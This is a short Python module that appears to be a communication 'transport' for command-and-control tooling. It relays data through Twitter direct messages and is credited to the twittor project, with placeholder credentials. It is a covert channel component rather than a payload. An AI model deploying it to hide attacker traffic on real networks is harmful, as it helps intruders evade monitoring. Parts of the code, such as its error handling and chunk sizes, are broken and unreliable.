# Sample transport that utilizes twitter as a communication channel.
# Most of the code is borrowed with love from https://github.com/PaulSec/twittor/

# TODO, consider if we need to delete DMs or not.

import tweepy
import struct
from time import sleep

# GHETTO CONFIG SECTION, TO BE EVENTUALLY UPDATED WHEN CONFIG READING IS PATCHED IN

CONSUMER_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
CONSUMER_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

ACCESS_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
ACCESS_TOKEN_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

USERNAME = 'XXXXXXXXXXXXXXXXXXXXXXXX'

def prepTransport():
	global api

	auth = tweepy.OAuthHandler(CONSUMER_TOKEN, CONSUMER_SECRET)
	auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)

	# Construct the api instance
	api = tweepy.API(auth)



def sendData(data):
	if len(data) > 10000: # This number is probably wrong. It should actually be the maximum allowable request length
		dataArray = [data[i:i + 6000] for i in range(0, len(data), 6000)]
		for chunk in dataArray:
			api.send_direct_message(user=USERNAME, text=chunk)
			sleep(0.1)
	else:
		api.send_direct_message(user=USERNAME, text=data)


def retrieveData():
	data = ""
	for message in api.direct_messages(count=200, full_text="true"):
		if (message.sender_screen_name == USERNAME):
			try:
				data += message.text # ignore the frame size
			except:
				data += None
				pass
	return data
